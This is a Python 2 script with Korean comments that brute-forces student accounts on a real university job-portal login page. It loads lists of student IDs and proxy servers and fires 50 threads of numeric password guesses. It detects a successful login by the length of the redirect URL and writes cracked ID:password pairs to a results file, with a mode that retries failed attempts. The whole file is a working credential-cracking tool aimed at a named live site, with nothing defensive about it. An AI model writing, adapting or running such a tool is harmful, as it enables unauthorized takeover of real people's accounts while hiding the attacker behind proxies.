#-*- coding: utf-8 -*-
import os
import time
import urllib
import urllib2
import threading

# https://www.sslproxies.org

exit_var = False # 스레드 종료 변수
thread_count = 50 # 최대 스레드 개수
sem = threading.Semaphore(thread_count) # 세마포어 설정

def crack_thread(start, end, id, proxyServer, saveFile, errorSaveFile): # 패스워드 크래킹 스레드
    global exit_var
    for password in range(start, end): # 설정한 패스워드 범위만큼 패스워드 크래킹 시도
        try:
            sem.acquire() # 임계영역 생성
            if exit_var == True: # 스레드 종료 변수 값이 설정됐을 경우
                sem.release() # 임계영역 해제
                return
            elif exit_var == False: # 스레드 종료 변수 값이 설정되지 않았을 경우
                now = time.localtime() # 현재 시간 저장
                year = now.tm_year
                month = now.tm_mon
                day = now.tm_mday
                hour = now.tm_hour
                minute = now.tm_min
                second = now.tm_sec
                date_time = str(year) + '.' + str(month) + '.' + str(day) + ' ' + str(hour) + ':' + str(minute) + ':' + str(second) # 현재 시간 저장
                print date_time + ' ' + id + ' ' + str(password) # 현재 시간 및 로그인 시도할 패스워드 출력
                proxy = urllib2.ProxyHandler({'http' : proxyServer}) # 프록시 설정
                values = {'actionID' : 'LOGIN_OK', 'BACK_URL' : '', 'chk_user_kind' : '01', 'id' : id, 'passwd2' : '', 'passwd' : str(password)} # HTTP Request Body 값 설정(HTML form 태그 안에 있는 input 태그의 name 및 값)
                opener = urllib2.build_opener(proxy)
                urllib2.install_opener(opener)
                data = urllib.urlencode(values)
                request = urllib2.Request('http://job.hknu.ac.kr/login.go', data) # HTTP Request Send(로그인 시도, HTML form 태그의 action 값)
                response = urllib2.urlopen(request) # HTTP Response Receive
                confirm = response.geturl()
                # print confirm # Test
                if len(confirm) == 76: # 길이 값 비교해서 76일 경우(로그인 실패 시 107, 로그인 성공 시 76 값이 나옴)
                    exit_var = True # 스레드 종료 변수 값 설정
                    fp = open(saveFile, 'a')
                    fp.write(id + ' : ' + str(password) + '\n') # 아이디, 패스워드를 파일에 저장
                    fp.close()
                    print '[*] ' + id + ' : ' + str(password)
                    sem.release() # 임계영역 해제
                    return
            sem.release() # 임계영역 해제
        except Exception, e:
            print '[-] ' + date_time + ' ' + id + ' ' + str(password) + ' ' + str(e) + '\n'
            fp = open(errorSaveFile, 'a')
            fp.write('[-] ' + date_time + ' ' + id + ' ' + str(password) + ' ' + str(e) + '\n') # 에러 정보, 발생 시간을 파일에 저장
            fp.close()
            sem.release() # 임계영역 해제
            pass

def crack(accountFile, proxyFile, saveFile, errorSaveFile, startPW, pw_range): # 일반 패스워드 크래킹 함수
    try:
        global exit_var
        global thread_count
        fp = open(accountFile, 'r') # 학번 정보가 저장된 파일 오픈
        id_lines = fp.readlines() # 로그인 시도할 계정(학번) 저장
        fp.close()
        fp = open(proxyFile, 'r') # 프록시 서버 IP 및 Port 정보가 저장된 파일 오픈
        proxyServer = fp.read() # 프록시 서버 IP 및 Port 저장(x.x.x.x:port)
        fp.close()
        threads = [] # 생성된 스레드를 저장할 리스트
        for id in id_lines: # 계정 수만큼 반복
            id = id.strip()
            for i in range(0, thread_count):
                th_crack = threading.Thread(target=crack_thread, args=(startPW + i * pw_range, startPW + i * pw_range + pw_range, id, proxyServer, saveFile, errorSaveFile,)) # 패스워드 크래킹 스레드 설정
                th_crack.start() # 스레드 생성
                threads.append(th_crack) # 생성된 스레드 저장
            for th in threads: # 생성된 스레드 수만큼 반복
                th.join() # 생성된 스레드 모두 종료될 때까지 대기
            exit_var = False # 스레드 종료 변수 초기화
    except Exception, e:
        print '[-] ', e

def errorCrack(errorFile, proxyFile, saveFile, errorSaveFile): # 에러 파일에 있는 패스워드 크래킹 함수
    try:
        fp = open(errorFile, 'r') # 에러 정보가 저장된 파일 오픈
        error_lines = fp.readlines() # 에러 내용 저장
        fp.close()
        fp = open(proxyFile, 'r') # 프록시 서버 IP 및 Port 정보가 저장된 파일 오픈
        proxyServer = fp.read() # 프록시 서버 IP 및 Port 저장(x.x.x.x:port)
        fp.close()
        for id_pw in error_lines: # 에러 파일의 라인 수만큼 반복
            try:
                id = id_pw.split(' ')[3] # 에러 라인에서 계정(학번)만 추출해서 저장
                password = id_pw.split(' ')[4] # 에러 라인에서 패스워드만 추출해서 저장
                now = time.localtime() # 현재 시간 저장
                year = now.tm_year
                month = now.tm_mon
                day = now.tm_mday
                hour = now.tm_hour
                minute = now.tm_min
                second = now.tm_sec
                date_time = str(year) + '.' + str(month) + '.' + str(day) + ' ' + str(hour) + ':' + str(minute) + ':' + str(second) # 현재 시간 저장
                print date_time + ' ' + id + ' ' + password # 현재 시간 및 로그인 시도할 패스워드 출력
                proxy = urllib2.ProxyHandler({'http' : proxyServer}) # 프록시 설정
                values = {'actionID' : 'LOGIN_OK', 'BACK_URL' : '', 'chk_user_kind' : '01', 'id' : id, 'passwd2' : '', 'passwd' : password} # HTTP Request Body 값 설정(HTML form 태그 안에 있는 input 태그의 name 및 값)
                opener = urllib2.build_opener(proxy)
                urllib2.install_opener(opener)
                data = urllib.urlencode(values)
                request = urllib2.Request('http://job.hknu.ac.kr/login.go', data) # HTTP Request Send(로그인 시도, HTML form 태그의 action 값)
                response = urllib2.urlopen(request) # HTTP Response Receive
                confirm = response.geturl()
                # print confirm # Test
                if len(confirm) == 76: # 길이 값 비교해서 76일 경우(로그인 실패 시 107, 로그인 성공 시 76 값이 나옴)
                    fp = open(saveFile, 'a')
                    fp.write(id + ' : ' + password + '\n') # 아이디, 패스워드를 파일에 저장
                    fp.close()
                    print '[*] ' + id + ' : ' + password
                    return
            except Exception, e:
                print '[-] ' + date_time + ' ' + id + ' ' + password + ' ' + str(e) + '\n'
                fp = open(errorSaveFile, 'a')
                fp.write('[-] ' + date_time + ' ' + id + ' ' + password + ' ' + str(e) + '\n') # 에러 정보, 발생 시간을 파일에 저장
                fp.close()
                pass
    except Exception, e:
        print '[-] ', e

def main():
    try:
        global thread_count
        crackType = raw_input('\n[Crack Type]\n1. New Cracking\n2. Error Cracking\n\nSelect Number : ') # 크래킹 타입 선택(일반 패스워드 크래킹, 에러 파일에 있는 패스워드 크래킹)
        if crackType == '1': # 일반 패스워드 크래킹일 경우
            accountFile = raw_input('Input Account File(Default Enter): ') # 학번 정보가 저장된 파일 입력
            if accountFile == '': # 학번 정보가 저장된 파일을 설정하지 않았을 경우
                accountFile = os.getcwd() + '\\Account.txt' # 현재 폴더에 있는 학번 정보가 저장된 파일로 설정
                print 'Set : ' + accountFile
            proxyFile = raw_input('Input Proxy File(Default Enter): ') # 프록시 서버 IP 및 Port 정보가 저장된 파일 입력
            if proxyFile == '': # 프록시 서버 IP 및 Port 정보가 저장된 파일을 설정하지 않았을 경우
                proxyFile = os.getcwd() + '\\Proxy.txt' # 현재 폴더에 있는 프록시 서버 IP 및 Port 정보가 저장된 파일로 설정
                print 'Set : ' + proxyFile
            saveFile = raw_input('Input Result File(Default Enter): ') # 크래킹 된 패스워드가 저장될 파일 입력
            if saveFile == '': # 크래킹 된 패스워드가 저장될 파일을 설정하지 않았을 경우
                saveFile = os.getcwd() + '\\Result.txt' # 현재 폴더로 크래킹 된 패스워드가 저장될 파일 설정
                print 'Set : ' + saveFile
            errorSaveFile = raw_input('Input Error Save File(Default Enter): ') # 에러 정보가 저장될 파일 입력
            if errorSaveFile == '': # 에러 정보가 저장될 파일을 설정하지 않았을 경우
                errorSaveFile = os.getcwd() + '\\Error.txt' # 현재 폴더로 에러 정보가 저장될 파일 설정
                print 'Set : ' + errorSaveFile
            startPW = raw_input('Input Start Password(Default Enter): ') # 시작 패스워드 입력
            if startPW == '': # 시작 패스워드를 입력하지 않았을 경우
                startPW = '1000000' # 시작 패스워드 디폴트 설정
                print 'Set : ' + startPW
            pw_range = (3000000 - int(startPW)) / thread_count # 패스워드 범위 설정
            crack(accountFile, proxyFile, saveFile, errorSaveFile, int(startPW), pw_range) # 일반 패스워드 크래킹 함수 실행
        elif crackType == '2': # 에러 파일에 있는 패스워드 크래킹일 경우
            errorFile = raw_input('Input Error File(Default Enter): ') # 에러 정보가 저장된 파일 입력
            if errorFile == '': # 에러 정보가 저장된 파일을 설정하지 않았을 경우
                errorFile = os.getcwd() + '\\Error.txt' # 현재 폴더에 있는 에러 정보가 저장된 파일로 설정
                print 'Set : ' + errorFile
            proxyFile = raw_input('Input Proxy File(Default Enter): ') # 프록시 서버 IP 및 Port 정보가 저장된 파일 입력
            if proxyFile == '': # 프록시 서버 IP 및 Port 정보가 저장된 파일을 설정하지 않았을 경우
                proxyFile = os.getcwd() + '\\Proxy.txt' # 현재 폴더에 있는 프록시 서버 IP 및 Port 정보가 저장된 파일로 설정
                print 'Set : ' + proxyFile
            saveFile = raw_input('Input Result File(Default Enter): ') # 크래킹 된 패스워드가 저장될 파일 입력
            if saveFile == '': # 크래킹 된 패스워드가 저장될 파일을 설정하지 않았을 경우
                saveFile = os.getcwd() + '\\Result.txt' # 현재 폴더로 크래킹 된 패스워드가 저장될 파일 설정
                print 'Set : ' + saveFile
            errorSaveFile = raw_input('Input Error Save File(Default Enter): ') # 에러 정보가 저장될 파일 입력
            if errorSaveFile == '': # 에러 정보가 저장될 파일을 설정하지 않았을 경우
                errorSaveFile = os.getcwd() + '\\Error_Error.txt' # 현재 폴더로 에러 정보가 저장될 파일 설정
                print 'Set : ' + errorSaveFile
            errorCrack(errorFile, proxyFile, saveFile, errorSaveFile) # 에러 파일에 있는 패스워드 크래킹 함수 실행
    except Exception, e:
        print '[-] ', e

if __name__ == '__main__':
	main()